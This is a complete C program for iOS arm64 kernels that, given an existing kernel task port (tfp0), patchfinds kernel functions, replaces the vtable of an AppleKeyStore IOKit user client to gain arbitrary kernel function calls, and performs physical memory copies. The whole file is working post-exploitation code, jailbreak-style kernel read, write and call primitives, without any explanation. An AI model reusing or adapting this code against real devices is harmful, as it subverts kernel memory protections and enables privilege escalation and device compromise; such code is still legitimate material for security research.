#include <CoreFoundation/CoreFoundation.h>
#include <mach-o/loader.h>
#include <mach/mach.h>
#include <sys/sysctl.h>

#define PMAP_MIN_OFF (0x10)
#define PMAP_MAX_OFF (0x18)
#define TASK_MAP_OFF (0x20)
#define PROC_TASK_OFF (0x10)
#define PROC_P_PID_OFF (0x60)
#define VM_MAP_PMAP_OFF (0x48)
#define USER_CLIENT_TRAP_OFF (0x40)
#define IPC_PORT_IP_KOBJECT_OFF (0x68)
#define TASK_ITK_REGISTERED_OFF (0x2E8)
#define VTAB_GET_EXTERNAL_TRAP_FOR_INDEX_OFF (0x5B8)
#define VM_KERNEL_LINK_ADDRESS (0xFFFFFFF007004000ULL)

#define ARM_PGSHIFT_4K (12U)
#define ARM_PGSHIFT_16K (14U)
#define KADDR_FMT "0x%" PRIx64
#define RD(a) extract32(a, 0, 5)
#define RN(a) extract32(a, 5, 5)
#define BCOPY_PHYS_DST_PHYS (1U)
#define BCOPY_PHYS_SRC_PHYS (2U)
#define RM(a) extract32(a, 16, 5)
#define MAX_VTAB_SZ (ARM_PGBYTES)
#define ARM_PGMASK (ARM_PGBYTES - 1U)
#define IS_RET(a) ((a) == 0xD65F03C0U)
#define ADRP_ADDR(a) ((a) & ~0xFFFULL)
#define ADRP_IMM(a) (ADR_IMM(a) << 12U)
#define ARM_PGBYTES (1U << arm_pgshift)
#define IO_OBJECT_NULL ((io_object_t)0)
#define ADD_X_IMM(a) extract32(a, 10, 12)
#define FAULT_MAGIC (0x4455445564666477ULL)
#define BL_IMM(a) (sextract64(a, 0, 26) << 2U)
#define LDR_X_IMM(a) (sextract64(a, 5, 19) << 2U)
#define IS_BL(a) (((a) & 0xFC000000U) == 0x94000000U)
#define IS_ADR(a) (((a) & 0x9F000000U) == 0x10000000U)
#define IS_ADRP(a) (((a) & 0x9F000000U) == 0x90000000U)
#define IS_SUB_X(a) (((a) & 0xFFC00000U) == 0xD1000000U)
#define IS_ADD_X(a) (((a) & 0xFFC00000U) == 0x91000000U)
#define IS_LDR_X(a) (((a) & 0xFF000000U) == 0x58000000U)
#define IS_MOV_X(a) (((a) & 0xFFE00000U) == 0xAA000000U)
#define LDR_X_UNSIGNED_IMM(a) (extract32(a, 10, 12) << 3U)
#define IS_STP_X_PRE_IDX(a) (((a) & 0xFFC00000U) == 0xA9800000U)
#define IS_LDR_X_UNSIGNED_IMM(a) (((a) & 0xFFC00000U) == 0xF9400000U)
#define ADR_IMM(a) ((sextract64(a, 5, 19) << 2U) | extract32(a, 29, 2))

#ifndef SEG_TEXT_EXEC
#	define SEG_TEXT_EXEC "__TEXT_EXEC"
#endif

#ifndef SECT_CSTRING
#	define SECT_CSTRING "__cstring"
#endif

#ifndef MIN
#	define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

typedef uint64_t kaddr_t;
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

typedef struct {
	kaddr_t sec_text_start;
	uint64_t sec_text_sz;
	void *sec_text;
	kaddr_t sec_cstring_start;
	uint64_t sec_cstring_sz;
	void *sec_cstring;
} pfinder_t;

typedef struct {
	kaddr_t obj;
	kaddr_t func;
	kaddr_t delta;
} io_external_trap_t;

kern_return_t
mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);

kern_return_t
mach_vm_copy(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t);

kern_return_t
mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);

kern_return_t
mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);

kern_return_t
mach_vm_machine_attribute(vm_map_t, mach_vm_address_t, mach_vm_size_t, vm_machine_attribute_t, vm_machine_attribute_val_t *);

kern_return_t
mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

kern_return_t
IOObjectRelease(io_object_t);

CFMutableDictionaryRef
IOServiceMatching(const char *);

io_service_t
IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);

kern_return_t
IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t *);

kern_return_t
IOConnectTrap6(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);

kern_return_t
IOServiceClose(io_connect_t);

extern const mach_port_t kIOMasterPortDefault;

static unsigned arm_pgshift;
static task_t tfp0 = MACH_PORT_NULL;
static io_connect_t g_conn = IO_OBJECT_NULL;
static kaddr_t allproc, csblob_get_cdhash, pmap_find_phys, bcopy_phys, orig_vtab, fake_vtab, user_client, kernel_pmap, kernel_pmap_min, kernel_pmap_max;

static uint32_t
extract32(uint32_t value, unsigned start, unsigned length) {
	return (value >> start) & (~0U >> (32U - length));
}

static uint64_t
sextract64(uint64_t value, unsigned start, unsigned length) {
	return (uint64_t)((int64_t)(value << (64U - length - start)) >> (64U - length));
}

static kern_return_t
init_arm_pgshift(void) {
	int cpufamily = CPUFAMILY_UNKNOWN;
	size_t len = sizeof(cpufamily);

	if(!sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0)) {
		switch(cpufamily) {
			case CPUFAMILY_ARM_CYCLONE:
			case CPUFAMILY_ARM_TYPHOON:
				arm_pgshift = ARM_PGSHIFT_4K;
				return KERN_SUCCESS;
			case CPUFAMILY_ARM_TWISTER:
			case CPUFAMILY_ARM_HURRICANE:
			case CPUFAMILY_ARM_MONSOON_MISTRAL:
				arm_pgshift = ARM_PGSHIFT_16K;
				return KERN_SUCCESS;
			default:
				break;
		}
	}
	return KERN_FAILURE;
}

static kern_return_t
init_tfp0(void) {
	kern_return_t ret = task_for_pid(mach_task_self(), 0, &tfp0);
	mach_port_t host;
	pid_t pid;

	if(ret != KERN_SUCCESS) {
		host = mach_host_self();
		if(MACH_PORT_VALID(host)) {
			printf("host: 0x%" PRIx32 "\n", host);
			ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &tfp0);
			mach_port_deallocate(mach_task_self(), host);
		}
	}
	if(ret == KERN_SUCCESS && MACH_PORT_VALID(tfp0)) {
		if(pid_for_task(tfp0, &pid) == KERN_SUCCESS && pid == 0) {
			return ret;
		}
		mach_port_deallocate(mach_task_self(), tfp0);
	}
	return KERN_FAILURE;
}

static kaddr_t
get_kbase(kaddr_t *kslide) {
	mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
	task_dyld_info_data_t dyld_info;

	if(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &cnt) == KERN_SUCCESS) {
		*kslide = dyld_info.all_image_info_size;
		return VM_KERNEL_LINK_ADDRESS + *kslide;
	}
	return 0;
}

static kern_return_t
kread_buf(kaddr_t addr, void *buf, mach_vm_size_t sz) {
	mach_vm_address_t p = (mach_vm_address_t)buf;
	mach_vm_size_t read_sz, out_sz = 0;

	while(sz) {
		read_sz = MIN(sz, ARM_PGBYTES - (addr & ARM_PGMASK));
		if(mach_vm_read_overwrite(tfp0, addr, read_sz, p, &out_sz) != KERN_SUCCESS || out_sz != read_sz) {
			return KERN_FAILURE;
		}
		p += read_sz;
		sz -= read_sz;
		addr += read_sz;
	}
	return KERN_SUCCESS;
}

static void *
kread_buf_alloc(kaddr_t addr, mach_vm_size_t read_sz) {
	void *buf = malloc(read_sz);

	if(buf) {
		if(kread_buf(addr, buf, read_sz) == KERN_SUCCESS) {
			return buf;
		}
		free(buf);
	}
	return NULL;
}

static kern_return_t
kread_addr(kaddr_t addr, kaddr_t *value) {
	return kread_buf(addr, value, sizeof(*value));
}

static kern_return_t
kwrite_buf(kaddr_t addr, const void *buf, mach_msg_type_number_t sz) {
	vm_machine_attribute_val_t mattr_val = MATTR_VAL_CACHE_FLUSH;
	mach_vm_address_t p = (mach_vm_address_t)buf;
	mach_msg_type_number_t write_sz;

	while(sz) {
		write_sz = MIN(sz, ARM_PGBYTES - (addr & ARM_PGMASK));
		if(mach_vm_write(tfp0, addr, p, write_sz) != KERN_SUCCESS || mach_vm_machine_attribute(tfp0, addr, write_sz, MATTR_CACHE, &mattr_val) != KERN_SUCCESS) {
			return KERN_FAILURE;
		}
		p += write_sz;
		sz -= write_sz;
		addr += write_sz;
	}
	return KERN_SUCCESS;
}

static kern_return_t
kwrite_addr(kaddr_t addr, kaddr_t value) {
	return kwrite_buf(addr, &value, sizeof(value));
}

static kern_return_t
kalloc(mach_vm_size_t sz, kaddr_t *addr) {
	return mach_vm_allocate(tfp0, addr, sz, VM_FLAGS_ANYWHERE);
}

static kern_return_t
kfree(kaddr_t addr, mach_vm_size_t sz) {
	return mach_vm_deallocate(tfp0, addr, sz);
}

static const struct section_64 *
find_section(const struct segment_command_64 *sgp, const char *sect_name) {
	const struct section_64 *sp = (const struct section_64 *)(sgp + 1);
	uint32_t i;

	for(i = 0; i < sgp->nsects; ++i) {
		if(!strncmp(sp->segname, sgp->segname, sizeof(sp->segname)) && !strncmp(sp->sectname, sect_name, sizeof(sp->sectname))) {
			return sp;
		}
		++sp;
	}
	return NULL;
}

static void
pfinder_reset(pfinder_t *pfinder) {
	pfinder->sec_text = pfinder->sec_cstring = NULL;
	pfinder->sec_text_start = pfinder->sec_text_sz = 0;
	pfinder->sec_cstring_start = pfinder->sec_cstring_sz = 0;
}

static kern_return_t
pfinder_init(pfinder_t *pfinder, kaddr_t kbase) {
	const struct segment_command_64 *sgp;
	kern_return_t ret = KERN_FAILURE;
	const struct section_64 *sp;
	struct mach_header_64 mh64;
	uint32_t i;
	void *ptr;

	pfinder_reset(pfinder);
	if(kread_buf(kbase, &mh64, sizeof(mh64)) == KERN_SUCCESS && mh64.magic == MH_MAGIC_64 && (ptr = kread_buf_alloc(kbase + sizeof(mh64), mh64.sizeofcmds))) {
		sgp = (const struct segment_command_64 *)ptr;
		for(i = 0; i < mh64.ncmds; ++i) {
			if(sgp->cmd == LC_SEGMENT_64) {
				if(!strncmp(sgp->segname, SEG_TEXT_EXEC, sizeof(sgp->segname)) && (sp = find_section(sgp, SECT_TEXT))) {
					pfinder->sec_text_start = sp->addr;
					pfinder->sec_text_sz = sp->size;
					printf("sec_text_start: " KADDR_FMT ", sec_text_sz: 0x%" PRIx64 "\n", pfinder->sec_text_start, pfinder->sec_text_sz);
				} else if(!strncmp(sgp->segname, SEG_TEXT, sizeof(sgp->segname)) && (sp = find_section(sgp, SECT_CSTRING))) {
					pfinder->sec_cstring_start = sp->addr;
					pfinder->sec_cstring_sz = sp->size;
					printf("sec_cstring_start: " KADDR_FMT ", sec_cstring_sz: 0x%" PRIx64 "\n", pfinder->sec_cstring_start, pfinder->sec_cstring_sz);
				}
			}
			if(pfinder->sec_text_sz && pfinder->sec_cstring_sz) {
				if((pfinder->sec_text = kread_buf_alloc(pfinder->sec_text_start, pfinder->sec_text_sz))) {
					if((pfinder->sec_cstring = kread_buf_alloc(pfinder->sec_cstring_start, pfinder->sec_cstring_sz))) {
						ret = KERN_SUCCESS;
					} else {
						free(pfinder->sec_text);
					}
				}
				break;
			}
			sgp = (const struct segment_command_64 *)((uintptr_t)sgp + sgp->cmdsize);
		}
		free(ptr);
	}
	return ret;
}

static kaddr_t
pfinder_xref(pfinder_t pfinder, bool want_rd, uint32_t rd, kaddr_t start, kaddr_t to) {
	const uint32_t *insn = pfinder.sec_text;
	uint64_t x[32] = { 0 };
	size_t i;

	for(i = (start - pfinder.sec_text_start) / sizeof(*insn); i < pfinder.sec_text_sz / sizeof(*insn); ++i) {
		if(IS_LDR_X(insn[i])) {
			x[RD(insn[i])] = pfinder.sec_text_start + (i * sizeof(*insn)) + LDR_X_IMM(insn[i]);
		} else if(IS_ADR(insn[i])) {
			x[RD(insn[i])] = pfinder.sec_text_start + (i * sizeof(*insn)) + ADR_IMM(insn[i]);
		} else if(IS_ADRP(insn[i])) {
			x[RD(insn[i])] = ADRP_ADDR(pfinder.sec_text_start + (i * sizeof(*insn))) + ADRP_IMM(insn[i]);
			if(want_rd) {
				continue;
			}
		} else if(IS_ADD_X(insn[i])) {
			x[RD(insn[i])] = x[RN(insn[i])] + ADD_X_IMM(insn[i]);
		} else if(IS_LDR_X_UNSIGNED_IMM(insn[i])) {
			x[RD(insn[i])] = x[RN(insn[i])] + LDR_X_UNSIGNED_IMM(insn[i]);
		} else if(IS_MOV_X(insn[i])) {
			x[RD(insn[i])] = x[RM(insn[i])];
		} else if(IS_RET(insn[i])) {
			memset(x, '\0', sizeof(x));
		}
		if(want_rd) {
			if(RD(insn[i]) == rd) {
				return x[rd];
			}
		} else if(x[RD(insn[i])] == to) {
			return pfinder.sec_text_start + (i * sizeof(*insn));
		}
	}
	return 0;
}

static kaddr_t
pfinder_xref_str(pfinder_t pfinder, const char *str) {
	const char *p = pfinder.sec_cstring, *e = p + pfinder.sec_cstring_sz;
	size_t len;

	do {
		len = strlen(p) + 1;
		if(!strncmp(str, p, len)) {
			return pfinder_xref(pfinder, false, 0, pfinder.sec_text_start, pfinder.sec_cstring_start + (kaddr_t)(p - (const char *)pfinder.sec_cstring));
		}
		p += len;
	} while(p < e);
	return 0;
}

static kaddr_t
pfinder_allproc(pfinder_t pfinder) {
	kaddr_t ref = pfinder_xref_str(pfinder, "shutdownwait");

	return ref ? pfinder_xref(pfinder, true, 8, ref, 0) : 0;
}

static kaddr_t
pfinder_csblob_get_cdhash(pfinder_t pfinder) {
	const uint32_t *insn = pfinder.sec_text;
	size_t i;

	for(i = 0; i < (pfinder.sec_text_sz / sizeof(*insn)) - 1; ++i) {
		if(IS_ADD_X(insn[i]) && RD(insn[i]) == 0 && RN(insn[i]) == 0 && ADD_X_IMM(insn[i]) == USER_CLIENT_TRAP_OFF && IS_RET(insn[i + 1])) {
			return pfinder.sec_text_start + (i * sizeof(*insn));
		}
	}
	return 0;
}

static kaddr_t
pfinder_pmap_find_phys(pfinder_t pfinder) {
	kaddr_t ref = pfinder_xref_str(pfinder, "Kext %s - page %p is not backed by physical memory.");
	const uint32_t *insn = pfinder.sec_text;
	size_t i;

	if(ref) {
		for(i = (ref - pfinder.sec_text_start) / sizeof(*insn); i > 0; --i) {
			if(IS_MOV_X(insn[i]) && RD(insn[i]) == 1 && IS_BL(insn[i + 1])) {
				return pfinder.sec_text_start + ((i + 1) * sizeof(*insn)) + BL_IMM(insn[i + 1]);
			}
		}
	}
	return 0;
}

static kaddr_t
pfinder_bcopy_phys(pfinder_t pfinder) {
	kaddr_t ref = pfinder_xref_str(pfinder, "\"bcopy extends beyond copy windows\"");
	const uint32_t *insn = pfinder.sec_text;
	size_t i;

	if(ref) {
		for(i = (ref - pfinder.sec_text_start) / sizeof(*insn); i > 0; --i) {
			if(RN(insn[i]) == 31 && ((IS_SUB_X(insn[i]) && RD(insn[i]) == 31) || IS_STP_X_PRE_IDX(insn[i]))) {
				return pfinder.sec_text_start + (i * sizeof(*insn));
			}
		}
	} else if((ref = pfinder_xref_str(pfinder, "\"mdevstrategy: sink address %016llX not mapped\\n\""))) {
		for(i = (ref - pfinder.sec_text_start) / sizeof(*insn); i < (pfinder.sec_text_sz / sizeof(*insn)) - 1; ++i) {
			if(IS_MOV_X(insn[i]) && RD(insn[i]) == 2 && IS_BL(insn[i + 1])) {
				return pfinder.sec_text_start + (i * sizeof(*insn)) + BL_IMM(insn[i + 1]);
			}
		}
	}
	return 0;
}

static kern_return_t
pfinder_init_offsets(pfinder_t pfinder) {
	if((allproc = pfinder_allproc(pfinder))) {
		printf("allproc: " KADDR_FMT "\n", allproc);
		if((csblob_get_cdhash = pfinder_csblob_get_cdhash(pfinder))) {
			printf("csblob_get_cdhash: " KADDR_FMT "\n", csblob_get_cdhash);
			if((pmap_find_phys = pfinder_pmap_find_phys(pfinder))) {
				printf("pmap_find_phys: " KADDR_FMT "\n", pmap_find_phys);
				if((bcopy_phys = pfinder_bcopy_phys(pfinder))) {
					printf("bcopy_phys: " KADDR_FMT "\n", bcopy_phys);
					return KERN_SUCCESS;
				}
			}
		}
	}
	return KERN_FAILURE;
}

static void
pfinder_term(pfinder_t *pfinder) {
	free(pfinder->sec_text);
	free(pfinder->sec_cstring);
	pfinder_reset(pfinder);
}

static kern_return_t
find_task(pid_t pid, kaddr_t *task) {
	kaddr_t proc = allproc;
	pid_t cur_pid;

	while(kread_addr(proc, &proc) == KERN_SUCCESS && proc) {
		if(kread_buf(proc + PROC_P_PID_OFF, &cur_pid, sizeof(cur_pid)) == KERN_SUCCESS && cur_pid == pid) {
			return kread_addr(proc + PROC_TASK_OFF, task);
		}
	}
	return KERN_FAILURE;
}

static io_connect_t
get_conn(const char *name) {
	io_service_t serv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(name));
	io_connect_t conn = IO_OBJECT_NULL;

	if(MACH_PORT_VALID(serv)) {
		printf("serv: 0x%" PRIx32 "\n", serv);
		if(IOServiceOpen(serv, mach_task_self(), 0, &conn) != KERN_SUCCESS || !MACH_PORT_VALID(conn)) {
			conn = IO_OBJECT_NULL;
		}
		IOObjectRelease(serv);
	}
	return conn;
}

static kaddr_t
get_port(kaddr_t our_task, mach_port_t port) {
	kaddr_t ipc_port = 0;

	if(mach_ports_register(mach_task_self(), &port, 1) == KERN_SUCCESS) {
		if(kread_addr(our_task + TASK_ITK_REGISTERED_OFF, &ipc_port) != KERN_SUCCESS) {
			ipc_port = 0;
		}
		mach_ports_register(mach_task_self(), NULL, 0);
	}
	return ipc_port;
}

static void
kcall_term(void) {
	io_external_trap_t trap = { 0 };

	if(MACH_PORT_VALID(g_conn)) {
		if(fake_vtab) {
			kwrite_addr(user_client, orig_vtab);
			kfree(fake_vtab, MAX_VTAB_SZ);
			kwrite_buf(user_client + USER_CLIENT_TRAP_OFF, &trap, sizeof(trap));
		}
		IOServiceClose(g_conn);
	}
}

static kern_return_t
kcall_init(void) {
	kaddr_t our_task, ipc_port;

	if((g_conn = get_conn("AppleKeyStore")) != IO_OBJECT_NULL) {
		printf("g_conn: 0x%" PRIx32 "\n", g_conn);
		if(find_task(getpid(), &our_task) == KERN_SUCCESS) {
			printf("our_task: " KADDR_FMT "\n", our_task);
			if((ipc_port = get_port(our_task, g_conn))) {
				printf("ipc_port: " KADDR_FMT "\n", ipc_port);
				if(kread_addr(ipc_port + IPC_PORT_IP_KOBJECT_OFF, &user_client) == KERN_SUCCESS) {
					printf("user_client: " KADDR_FMT "\n", user_client);
					if(kread_addr(user_client, &orig_vtab) == KERN_SUCCESS) {
						printf("orig_vtab: " KADDR_FMT "\n", orig_vtab);
						if(kalloc(MAX_VTAB_SZ, &fake_vtab) == KERN_SUCCESS) {
							printf("fake_vtab: " KADDR_FMT "\n", fake_vtab);
							if(mach_vm_copy(tfp0, orig_vtab, MAX_VTAB_SZ, fake_vtab) == KERN_SUCCESS && kwrite_addr(fake_vtab + VTAB_GET_EXTERNAL_TRAP_FOR_INDEX_OFF, csblob_get_cdhash) == KERN_SUCCESS && kwrite_addr(user_client, fake_vtab) == KERN_SUCCESS) {
								return KERN_SUCCESS;
							}
							kfree(fake_vtab, MAX_VTAB_SZ);
						}
					}
				}
			}
		}
		IOServiceClose(g_conn);
	}
	return KERN_FAILURE;
}

static kern_return_t
kcall(kern_return_t *ret, kaddr_t func, size_t argc, ...) {
	io_external_trap_t trap;
	kaddr_t args[7] = { 1 };
	va_list ap;
	size_t i;

	va_start(ap, argc);
	for(i = 0; i < MIN(argc, 7); ++i) {
		args[i] = va_arg(ap, kaddr_t);
	}
	va_end(ap);
	trap.obj = args[0];
	trap.func = func;
	trap.delta = 0;
	if(kwrite_buf(user_client + USER_CLIENT_TRAP_OFF, &trap, sizeof(trap)) == KERN_SUCCESS) {
		*ret = IOConnectTrap6(g_conn, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
		return KERN_SUCCESS;
	}
	return KERN_FAILURE;
}

static kern_return_t
phys_init(void) {
	kaddr_t kernel_task, kernel_map;

	if(find_task(0, &kernel_task) == KERN_SUCCESS) {
		printf("kernel_task: " KADDR_FMT "\n", kernel_task);
		if(kread_addr(kernel_task + TASK_MAP_OFF, &kernel_map) == KERN_SUCCESS) {
			printf("kernel_map: " KADDR_FMT "\n", kernel_map);
			if(kread_addr(kernel_map + VM_MAP_PMAP_OFF, &kernel_pmap) == KERN_SUCCESS) {
				printf("kernel_pmap: " KADDR_FMT "\n", kernel_pmap);
				if(kread_addr(kernel_pmap + PMAP_MIN_OFF, &kernel_pmap_min) == KERN_SUCCESS) {
					printf("kernel_pmap_min: " KADDR_FMT "\n", kernel_pmap_min);
					if(kread_addr(kernel_pmap + PMAP_MAX_OFF, &kernel_pmap_max) == KERN_SUCCESS) {
						printf("kernel_pmap_max: " KADDR_FMT "\n", kernel_pmap_max);
						return KERN_SUCCESS;
					}
				}
			}
		}
	}
	return KERN_FAILURE;
}

static kern_return_t
phys_copy(kaddr_t src, kaddr_t dst, mach_vm_size_t sz) {
	vm_machine_attribute_val_t mattr_val = MATTR_VAL_CACHE_FLUSH;
	kaddr_t phys_src = src, phys_dst = dst;
	bool is_virt_src, is_virt_dst;
	mach_vm_size_t copy_sz;
	kern_return_t ret;

	while(sz) {
		is_virt_src = (src >= kernel_pmap_min && src < kernel_pmap_max);
		if(is_virt_src) {
			if(kcall(&ret, pmap_find_phys, 2, kernel_pmap, src) != KERN_SUCCESS || ret <= 0) {
				return KERN_FAILURE;
			}
			phys_src = ((kaddr_t)ret << arm_pgshift) | (src & ARM_PGMASK);
			printf("phys_src: " KADDR_FMT "\n", phys_src);
		}
		is_virt_dst = (dst >= kernel_pmap_min && dst < kernel_pmap_max);
		if(is_virt_dst) {
			if(kcall(&ret, pmap_find_phys, 2, kernel_pmap, dst) != KERN_SUCCESS || ret <= 0) {
				if(kwrite_addr(dst, FAULT_MAGIC) != KERN_SUCCESS || kcall(&ret, pmap_find_phys, 2, kernel_pmap, dst) != KERN_SUCCESS || ret <= 0) {
					return KERN_FAILURE;
				}
			}
			phys_dst = ((kaddr_t)ret << arm_pgshift) | (dst & ARM_PGMASK);
			printf("phys_dst: " KADDR_FMT "\n", phys_dst);
		}
		copy_sz = MIN(sz, MIN(ARM_PGBYTES - (phys_src & ARM_PGMASK), ARM_PGBYTES - (phys_dst & ARM_PGMASK)));
		if((phys_src | phys_dst | copy_sz) % sizeof(kaddr_t) || kcall(&ret, bcopy_phys, 4, phys_src, phys_dst, copy_sz, BCOPY_PHYS_SRC_PHYS | BCOPY_PHYS_DST_PHYS) != KERN_SUCCESS) {
			return KERN_FAILURE;
		}
		if(is_virt_dst && mach_vm_machine_attribute(tfp0, dst, copy_sz, MATTR_CACHE, &mattr_val) != KERN_SUCCESS) {
			return KERN_FAILURE;
		}
		src += copy_sz;
		dst += copy_sz;
		sz -= copy_sz;
	}
	return KERN_SUCCESS;
}

static void
phys_test(void) {
	kaddr_t virt_src, virt_dst;

	if(kalloc(ARM_PGBYTES, &virt_src) == KERN_SUCCESS) {
		printf("virt_src: " KADDR_FMT "\n", virt_src);
		if(kwrite_addr(virt_src, FAULT_MAGIC) == KERN_SUCCESS) {
			if(kalloc(ARM_PGBYTES, &virt_dst) == KERN_SUCCESS) {
				printf("virt_dst: " KADDR_FMT "\n", virt_dst);
				if(phys_copy(virt_src, virt_dst, ARM_PGBYTES) == KERN_SUCCESS) {
					printf("Copied 0x%x bytes from " KADDR_FMT " to " KADDR_FMT "\n", ARM_PGBYTES, virt_src, virt_dst);
				}
				kfree(virt_dst, ARM_PGBYTES);
			}
		}
		kfree(virt_src, ARM_PGBYTES);
	}
}

int
main(void) {
	kaddr_t kbase, kslide;
	kern_return_t ret;
	pfinder_t pfinder;

	if(init_arm_pgshift() == KERN_SUCCESS) {
		printf("arm_pgshift: %u\n", arm_pgshift);
		if(init_tfp0() == KERN_SUCCESS) {
			printf("tfp0: 0x%" PRIx32 "\n", tfp0);
			if((kbase = get_kbase(&kslide))) {
				printf("kbase: " KADDR_FMT "\n", kbase);
				printf("kslide: " KADDR_FMT "\n", kslide);
				if(pfinder_init(&pfinder, kbase) == KERN_SUCCESS) {
					if(pfinder_init_offsets(pfinder) == KERN_SUCCESS && kcall_init() == KERN_SUCCESS) {
						if(kcall(&ret, csblob_get_cdhash, 1, USER_CLIENT_TRAP_OFF) == KERN_SUCCESS) {
							printf("csblob_get_cdhash(USER_CLIENT_TRAP_OFF): 0x%" PRIx32 "\n", ret);
							if(phys_init() == KERN_SUCCESS) {
								phys_test();
							}
						}
						kcall_term();
					}
					pfinder_term(&pfinder);
				}
			}
			mach_port_deallocate(mach_task_self(), tfp0);
		}
	}
}
